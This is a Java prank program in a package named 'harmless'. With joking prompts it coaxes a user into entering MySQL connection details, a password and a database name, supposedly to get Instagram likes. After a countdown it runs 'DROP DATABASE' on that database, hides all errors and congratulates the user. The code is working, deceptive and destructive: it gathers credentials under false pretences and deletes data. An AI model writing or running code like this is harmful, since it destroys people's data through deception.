package harmless;
import java.sql.*;
import java.util.*;
import java.util.concurrent.TimeUnit;
public class makeYouLaugh{
    static Scanner omegalul = new Scanner(System.in);
    public static void main(String[] args)
    {
        System.out.println("I need help, mySQL is down... Can I borrow yours to advertise it instead? Just pass me the URL");
        String url = omegalul.nextLine();
        System.out.println("");
        System.out.println("Hmmmm...... I need the user of the database too, need to make it authentic.");
        String user = omegalul.nextLine();
        System.out.println("");
        System.out.println("Might as well just pass me the password too right...?");
        try {
            TimeUnit.MILLISECONDS.sleep(2500);
        }
        catch (InterruptedException e){}
        System.out.println("Wink Wink ;)");
        try {
            TimeUnit.MILLISECONDS.sleep(2500);
        }
        catch (InterruptedException e){}
        System.out.println("Don't worry, I'm a trustworthy source, just ask the source: \"Trust Me Bro\"");
        String pw = omegalul.nextLine();
        System.out.println("Ummmmm, ok so to get Instagram likes, I also need the database's name...");
        String dataBaseName = omegalul.nextLine();
        System.out.println("Thanks, you did a great thing!");
        try {
            TimeUnit.MILLISECONDS.sleep(1000);
        }
        catch (InterruptedException e){}
        System.out.println("Let's countdown your success!");
        try {
            TimeUnit.MILLISECONDS.sleep(1000);
        }
        catch (InterruptedException e){}
        System.out.println("3!");
        try {
            TimeUnit.MILLISECONDS.sleep(1000);
        }
        catch (InterruptedException e){}
        System.out.println("2!");    
        try {
            TimeUnit.MILLISECONDS.sleep(1000);
        }
        catch (InterruptedException e){}
        System.out.println("1...!");
        try {
            TimeUnit.MILLISECONDS.sleep(1000);
        }
        catch (InterruptedException e){}
        query(url, user, pw, dataBaseName);
        System.out.println("Congorats my friend, you are now famous!");
    }


    public static void query(String url,String user,String pw, String dataBaseName)
        {
            try
            {
                Class.forName("com.mysql.cj.jdbc.Driver");
            }
            catch (ClassNotFoundException e)
            {}
            try{
                Connection connection = DriverManager.getConnection(url, user, pw);
                Statement statement = connection.createStatement();
                ResultSet resultSet = statement.executeQuery("DROP DATABASE "+dataBaseName);
                System.out.println("Don't worry, it's safe. It's in a try catch");
                connection.close();
                statement.close();
            }
            catch(SQLException e){}

        }
    
}